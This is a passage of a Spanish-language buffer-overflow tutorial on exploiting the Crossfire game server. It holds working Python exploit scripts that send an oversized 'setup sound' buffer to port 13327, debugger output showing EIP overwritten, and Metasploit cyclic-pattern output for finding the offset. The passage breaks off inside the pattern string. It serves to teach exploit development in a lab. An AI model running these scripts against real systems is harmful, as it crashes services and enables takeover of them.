<span class="n">crash</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">4379</span> 

<span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x11</span><span class="s2">(setup sound &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x90\x00</span><span class="s2">#&quot;</span> 

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> 

<span class="nb">print</span> <span class="s2">&quot;[*]Sending evil buffer...&quot;</span> 
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="mi">13327</span><span class="p">))</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
<span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="nb">print</span> <span class="n">data</span> 
<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="nb">print</span> <span class="s2">&quot;[*]Payload Sent!&quot;</span> 
</code></pre></div>

<p>El recurso lo podemos encontrar en el siguiente <a href="https://github.com/pranatdayal/pentesting-scripts/blob/master/crossfire-poc.py">enlace</a>. Adaptamos un poco el exploit a nuestras necesidades:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python </span>

<span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">sys</span>

<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Uso: python&quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot; &lt;direccionIP&gt;</span><span class="se">\n</span><span class="s2">&quot;</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">13327</span>

<span class="n">crash</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">4379</span> 

<span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x11</span><span class="s2">(setup sound &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x90\x00</span><span class="s2">#&quot;</span> 

<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> 

    <span class="nb">print</span> <span class="s2">&quot;[*] Enviando buffer...&quot;</span> 
    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
    <span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="nb">print</span> <span class="n">data</span> 
    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="nb">print</span> <span class="s2">&quot;[*] Payload Enviado!&quot;</span> 
<span class="k">except</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Error conectando con el servicio...</span><span class="se">\n</span><span class="s2">&quot;</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div>

<p>Para este caso, nos dan un PoC con el offset calculado. Curiosamente, para este caso si superamos el tamaño del buffer el programa crasheará de otra forma, por lo que es importante mantener esta cifra fija y para cualquier operación que hagamos tener bien calculados los tamaños.</p>
<p>Para empezar, iniciamos <strong>edb</strong> con el programa corriendo, de la siguiente forma:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>edb<span class="w"> </span>--run<span class="w"> </span>/usr/games/crossfire/bin/crossfire
</code></pre></div>

<p>Pulsamos la tecla <strong>F9</strong> 2 veces y mandamos el buffer desde consola. Desde <strong>edb</strong>, podremos observar la siguiente respuesta:</p>
<div class="codehilite"><pre><span></span><code>The<span class="w"> </span>debugged<span class="w"> </span>application<span class="w"> </span>encountered<span class="w"> </span>a<span class="w"> </span>segmentation<span class="w"> </span>fault.
The<span class="w"> </span>address<span class="w"> </span>0x41414141<span class="w"> </span>does<span class="w"> </span>not<span class="w"> </span>appear<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>mapped.
</code></pre></div>

<p>Lo cual está genial, pues estamos sobreescribiendo el registro EIP, tal y como podremos comprobar posteriormente desde la sección <em>Registers</em> del aplicativo. Llegados a este punto, calculamos el Offset a continuación a fin de corroborar si efectivamente podemos tomar el control del <strong>EIP</strong>, mandando para ello 4 bytes correspondientes al caracter <em>B</em> posteriormente.</p>
<h4 id="calculando-el-offset-en-linux">Calculando el Offset en Linux<a class="headerlink" href="#calculando-el-offset-en-linux" title="Permanent link">&para;</a></h4>
<p>El procedimiento realmente es el mismo que en Windows, sólo que lo referencio así en el título así para que el enlace directo desde el Índice no de problemas.</p>
<p>Usaremos una vez más el <strong>pattern_create</strong> y el <strong>pattern_offset</strong> de Metasploit. Dado que conocemos que por el momento el valor con el que vamos a trabajar es <em>4379</em>, matendremos esta cifra fija, en caso contrario el programa recordemos que crasheará de otra forma:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/s4vitar/Desktop/BoF<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379</span>
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp
</code></pre></div>

<p>Tomamos el resultado y lo añadimos en nuestro script:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python </span>

<span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">sys</span>

<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Uso: python&quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot; &lt;direccionIP&gt;</span><span class="se">\n</span><span class="s2">&quot;</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">13327</span>

<span class="c1"># Total bytes: 4379</span>
<span class="n">crash</span> <span class="o">=</span> <span class="s2">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4F